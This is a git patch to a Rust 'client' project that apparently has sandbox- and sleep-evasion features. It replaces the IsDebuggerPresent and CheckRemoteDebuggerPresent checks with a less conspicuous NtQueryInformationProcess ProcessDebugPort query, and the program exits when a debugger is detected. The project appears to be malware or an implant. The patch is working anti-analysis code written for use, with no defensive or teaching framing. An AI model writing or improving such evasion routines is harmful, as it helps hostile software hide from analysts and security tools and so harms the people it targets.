@@ -1,0 +1,81 @@
+From 5cb2dec35829df954a1ed2985142095ab9722708 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Sun, 18 Oct 2026 10:20:14 +0700
+Subject: [PATCH 11/14] convert IsDebuggerPresent, CheckRemoteDebuggerPresent,
+ and GetCurrentProcessId to using NtQueryInformationProcess
+
+---
+ client/Cargo.toml     |  2 +-
+ client/src/sandbox.rs | 32 +++++++++++++++++++-------------
+ 2 files changed, 20 insertions(+), 14 deletions(-)
+
+diff --git a/client/Cargo.toml b/client/Cargo.toml
+index 22b6d12..78feb3f 100644
+--- a/client/Cargo.toml
++++ b/client/Cargo.toml
+@@ -27,7 +27,7 @@ daemonize = "0.5"
+ crate-type = ["cdylib"]
+ 
+ [target.'cfg(windows)'.dependencies]
+-winapi = { version = "0.3", features = ["debugapi","memoryapi"] }
++winapi = { version = "0.3", features = ["debugapi","memoryapi", "processthreadsapi", "winternl"] }
+ ntapi = "0.4.1"
+ winreg = "0.52"
+ windows = { version = "0.*", features = [
+diff --git a/client/src/sandbox.rs b/client/src/sandbox.rs
+index 0ac427c..d89d1a1 100644
+--- a/client/src/sandbox.rs
++++ b/client/src/sandbox.rs
+@@ -4,15 +4,15 @@ use std::time::{Duration, Instant, SystemTime};
+ use sysinfo::System;
+ 
+ #[cfg(windows)]
+-use winapi::shared::ntdef::NT_SUCCESS;
++use winapi::shared::ntdef::{HANDLE, NT_SUCCESS, NULL};
+ #[cfg(windows)]
+-use winapi::um::debugapi::{CheckRemoteDebuggerPresent, IsDebuggerPresent};
++use winapi::um::processthreadsapi::GetCurrentProcess;
+ #[cfg(windows)]
+-use winapi::um::processthreadsapi::{GetCurrentProcess, GetCurrentProcessId};
++use winapi::um::winternl::{NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
+ #[cfg(windows)]
+-use winapi::um::winnt::PEB;
++const ProcessDebugPort: i32 = 7;
+ #[cfg(windows)]
+-use winapi::um::winternl::{NtQueryInformationProcess, PROCESS_BASIC_INFORMATION};
++use winapi::um::winnt::PEB;
+ 
+ pub fn check_memory_limit() {
+     let mut system = System::new_all();
+@@ -155,14 +155,20 @@ pub fn sleep_evasion(sleep_duration: Duration) {
+ #[cfg(windows)]
+ pub fn check_debugger() {
+     unsafe {
+-        // 1. IsDebuggerPresent and CheckRemoteDebuggerPresent
+-        let mut is_remote_debugger_present = 0;
+-        if IsDebuggerPresent() != 0
+-            || (CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_remote_debugger_present)
+-                != 0
+-                && is_remote_debugger_present != 0)
+-        {
+-            println!("Debugger detected! Exiting program.");
++        let process_handle = GetCurrentProcess();
++        let mut debug_port: usize = 0;
++        let mut return_length: u32 = 0;
++
++        // 1. Check for debugger using ProcessDebugPort
++        let status = NtQueryInformationProcess(
++            process_handle,
++            ProcessDebugPort,
++            &mut debug_port as *mut _ as *mut _,
++            std::mem::size_of::<usize>() as u32,
++            &mut return_length,
++        );
++        if NT_SUCCESS(status) && debug_port != 0 {
++            println!("Debugger detected via ProcessDebugPort! Exiting program.");
+             exit(1);
+         }
+ 
+-- 
+2.39.5 (Apple Git-154)
+
